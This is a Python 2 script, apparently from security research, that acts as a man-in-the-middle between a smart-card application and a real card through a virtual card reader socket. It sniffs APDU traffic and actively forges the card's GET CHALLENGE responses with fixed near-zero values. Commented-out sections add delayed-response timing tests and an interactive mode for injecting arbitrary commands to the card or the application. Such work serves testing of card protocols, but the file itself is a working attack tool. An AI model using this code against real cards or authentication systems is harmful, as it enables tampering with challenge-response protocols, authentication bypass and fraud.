#!/usr/bin/python

# A small part of this code is taken from https://github.com/frankmorgner/vsmartcard/blob/master/virtualsmartcard/src/vpicc/virtualsmartcard/VirtualSmartcard.py
# The remaining, which is a larger part, is original. 

import atexit
import signal
import sys
import struct
import socket
from smartcard.System import readers
import time

_Csizeof_short = len(struct.pack('h', 0))

VPCD_CTRL_LEN = 1
VPCD_CTRL_OFF = 0
VPCD_CTRL_ON = 1
VPCD_CTRL_RESET = 2
VPCD_CTRL_ATR = 4

# connect to the real card
reader = readers()[2]
connection = reader.createConnection()
connection.connect()

# connect to vpicc
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(('localhost', 35963))
sock.settimeout(None)

def sendToVPICC(msg):
    sock.sendall(struct.pack('!H', len(msg)) + msg)

def recvFromVPICC():
    sizestr = sock.recv(_Csizeof_short)
    if len(sizestr) == 0:
        raise socket.error
    size = struct.unpack('!H', sizestr)[0]
    # print size

    if size:
        msg = sock.recv(size)
        if len(msg) == 0:
            raise socket.error
    else:
        msg = None

    return size, msg

def stop(_, __):
    connection.disconnect()
    sock.close()
    print ''
    print 'Exit...'
    sys.exit(0)

print ''
print 'Simple Man-in-the-Middle application for sniffing and altering' 
print 'apdu communication between card and application.'
print ''
print 'When prompted for input, type "toCard + message" to send apdu'
print 'command to the card, or type "toApp + message" to send response' 
print 'to the application.'
print ''
print 'Use Ctrl + C to exit.'
print ''
print 'Waiting for connection from application...'
print ''





"""
Need the following functions

"""


def char_to_hex(char):
    return hex(ord(char)).replace('x', '0')[-2:]






flag = 0
counter = -2
timeitnow=0
while True:
    try:
        (size, msg) = recvFromVPICC()
    except socket.error as e:
        sys.exit()

    if size == VPCD_CTRL_LEN:
        if msg == chr(VPCD_CTRL_OFF):
            pass
        elif msg == chr(VPCD_CTRL_ON):
            pass
        elif msg == chr(VPCD_CTRL_RESET):
            pass
        elif msg == chr(VPCD_CTRL_ATR):
            _atr_hex_str = ('3B DC 18 FF 81 91 FE 1F C3 80 73 '
                          + 'C8 21 13 66 01 0B 03 52 00 05 38')
            _atr_char_array = [chr(int(_, 16)) for _ in _atr_hex_str.split()]
            atr = ''.join(_atr_char_array)
            sendToVPICC(atr)

    else:
        if size != len(msg):
            print format("Expected %u bytes, but received only %u",size, len(msg))

        _apdu_hex_array = [char_to_hex(_) for _ in msg]
        apdu = ' '.join(_apdu_hex_array)
        smessage = [int(_, 16) for _ in apdu.split()]

        data,sw1,sw2 = connection.transmit(smessage)

        _response_int_array = data + [sw1] + [sw2]
        _response_hex_array = []

        for _ in _response_int_array:
            _response_hex_array.append(char_to_hex(chr(_)))

        response = ' '.join(_response_hex_array)

        _message_hex_array = _response_hex_array
        _message_chr_array = []
        for _ in _message_hex_array:
            _message_chr_array.append(chr(int(_, 16)))
        message = ''.join(_message_chr_array)

    #     _in = raw_input()
    #     if _in == '':
    #         print apdu
    #         print response
    #         print ''
    #         sendToVPICC(message)
    # else:
    #         message = '00 00 00 00 00 00 00 00 90 00'
    #         print apdu
    #         print message
    #         print ''
    #         message = message.split()
    #         out = []
    #         for i in message:
    #             out.append(chr(int(i,16)))
    #         sendToVPICC(''.join(out))


        ############################################################
        if counter != 1:
            if timeitnow == 0:
                start = time.time()
                timeitnow=1

            if apdu == '00 84 00 00 08':

                if counter == -2:
                    m = '00 00 00 00 00 00 00 01 90 00'
                elif counter == -1:
                    m = '00 00 00 00 00 00 00 01 90 00'
                elif counter == 0:
                    m = '00 00 00 00 00 00 00 00 90 00'
                else:
                    m = '00 00 00 00 00 00 00 00 90 00'

                # print apdu
                print m
                print response
                print ''
                m = m.split()
                out = []
                for i in m:
                    out.append(chr(int(i,16)))
                sendToVPICC(''.join(out))
                counter +=1
                flag = 1
            else:
                if flag == 1:
                    print apdu
                    print response
                    print ''
                    flag =0
                sendToVPICC(message)
        else:
            if apdu == '00 84 00 00 08':
                print apdu
                print response
                print 'here now!'
                end = time.time()
                print end - start
                print ''
                sendToVPICC(message)
                counter =0
                flag = 1
            else:
                if flag == 1:
                    print apdu
                    print response
                    print ''
                    flag = 0
                sendToVPICC(message)

##############################################################################################
            # if flag == 1:
            #     sys.exit()

        ##############################################################
        # if apdu.split()[0:5] == ['80', '20', '00', '00', '10']:
        #     print apdu
        #     print 'not transmitted yet!'

        #     time.sleep(121)

        #     data,sw1,sw2 = connection.transmit(smessage)

        #     _response_int_array = data + [sw1] + [sw2]
        #     _response_hex_array = []
            
        #     for _ in _response_int_array:
        #         _response_hex_array.append(char_to_hex(chr(_)))
            
        #     response = ' '.join(_response_hex_array)

        #     _message_hex_array = _response_hex_array
        #     _message_chr_array = []
        #     for _ in _message_hex_array:
        #         _message_chr_array.append(chr(int(_, 16)))
        #     message = ''.join(_message_chr_array)

        #     print response
        #     print '61 seconds late'
        #     print ''
        #     sendToVPICC(message)
        #     sys.exit()
        # else:
        #     data,sw1,sw2 = connection.transmit(smessage)

        #     _response_int_array = data + [sw1] + [sw2]
        #     _response_hex_array = []
            
        #     for _ in _response_int_array:
        #         _response_hex_array.append(char_to_hex(chr(_)))
            
        #     response = ' '.join(_response_hex_array)

        #     _message_hex_array = _response_hex_array
        #     _message_chr_array = []
        #     for _ in _message_hex_array:
        #         _message_chr_array.append(chr(int(_, 16)))
        #     message = ''.join(_message_chr_array)

        #     print apdu
        #     print response
        #     print ''
        #     sendToVPICC(message)


        # if apdu.split()[0:5] == ['00', '84', '00', '00', '08']:
        #     print apdu

        #     data,sw1,sw2 = connection.transmit(smessage)

        #     _response_int_array = data + [sw1] + [sw2]
        #     _response_hex_array = []
            
        #     for _ in _response_int_array:
        #         _response_hex_array.append(char_to_hex(chr(_)))
            
        #     response = ' '.join(_response_hex_array)

        #     _message_hex_array = _response_hex_array
        #     _message_chr_array = []
        #     for _ in _message_hex_array:
        #         _message_chr_array.append(chr(int(_, 16)))
        #     message = ''.join(_message_chr_array)


            
        #     print response
        #     print ''
        #     sendToVPICC(message)

        # elif apdu.split()[0:5] == ['80', '20', '00', '00', '10']:

        #     print apdu

        #     # t = 11

        #     # # this will delay the time it takes to calculate the answer to the challenege and will hopefully fail
        #     # print 'delaying response (random number X) to application library by ' + str(t) +' seconds'
        #     # time.sleep(t)
        #     data,sw1,sw2 = connection.transmit(smessage)

        #     _response_int_array = data + [sw1] + [sw2]
        #     _response_hex_array = []
            
        #     for _ in _response_int_array:
        #         _response_hex_array.append(char_to_hex(chr(_)))
            
        #     response = ' '.join(_response_hex_array)

        #     _message_hex_array = _response_hex_array
        #     _message_chr_array = []
        #     for _ in _message_hex_array:
        #         _message_chr_array.append(chr(int(_, 16)))
        #     message = ''.join(_message_chr_array)

        #     # print 'delaying response to smartcard by ' str(t) +' seconds'
        #     print response
        #     print ''
        #     sendToVPICC(message)

        # else:
        #     data,sw1,sw2 = connection.transmit(smessage)

        #     _response_int_array = data + [sw1] + [sw2]
        #     _response_hex_array = []
            
        #     for _ in _response_int_array:
        #         _response_hex_array.append(char_to_hex(chr(_)))
            
        #     response = ' '.join(_response_hex_array)

        #     _message_hex_array = _response_hex_array
        #     _message_chr_array = []
        #     for _ in _message_hex_array:
        #         _message_chr_array.append(chr(int(_, 16)))
        #     message = ''.join(_message_chr_array)

        #     # print apdu
        #     # print response
        #     # print ''
        #     sendToVPICC(message)




    signal.signal(signal.SIGINT, stop)
    

























    #     _apdu_hex_array = [char_to_hex(_) for _ in msg]
    #     apdu = ' '.join(_apdu_hex_array)
    #     print '\033[94m' + 'intercepted apdu: ' + apdu + '\033[0m'

    #     _is_relaying_message = False

    #     while True:
    #         if _is_relaying_message:
    #             action = 'toApp'
    #             _message_hex_str = response
    #             _is_relaying_message = False
          
    #         else:
    #             try:
    #                 _input = raw_input('\033[2m' + '> ' + '\033[0m').strip()
    #                 if not _input:
    #                     raise ValueError
    #                 try:
    #                     action, _message_hex_str = _input.split(' ', 1)
    #                 except ValueError:
    #                     action = _input
    #                     if action == 'relay':
    #                         print '\033[2m\033[95m' + 'relaying apdu/response pair...' + '\033[0m'
    #                         _is_relaying_message = True
    #                         action = 'toCard'
    #                         _message_hex_str = apdu
    #                     elif action in ['toCard', 'toApp']:
    #                         print '\033[91m' + 'no input message...' + '\033[0m'
    #                         raise ValueError
    #             except ValueError:
    #                 continue

    #         if action == 'toCard':
    #             print '\033[2m\033[94m' + 'sent apdu: ' + _message_hex_str + '\033[0m'
    #             message = [int(_, 16) for _ in _message_hex_str.split()]
    #             (data, sw1, sw2) = connection.transmit(message)
    #             _response_int_array = data + [sw1] + [sw2]
    #             _response_hex_array = []
    #             for _ in _response_int_array:
    #                 _response_hex_array.append(char_to_hex(chr(_)))
    #             response = ' '.join(_response_hex_array)
    #             print '\033[92m' + 'intercepted response: ' + response + '\033[0m'

    #         elif action == 'toApp':
    #             print '\033[2m\033[92m' + 'sent response: ' + _message_hex_str + '\033[0m'
    #             _message_hex_array = _message_hex_str.split()
    #             _message_chr_array = []
    #             for _ in _message_hex_array:
    #                 _message_chr_array.append(chr(int(_, 16)))
    #             message = ''.join(_message_chr_array)
    #             sendToVPICC(message)
    #             break
    #             # THIS WILL BREAK OUT OF THE WHILE LOOP!

    #         else:
    #             print '\033[91m' + 'invalid operation...' + '\033[0m'

    # signal.signal(signal.SIGINT, stop)
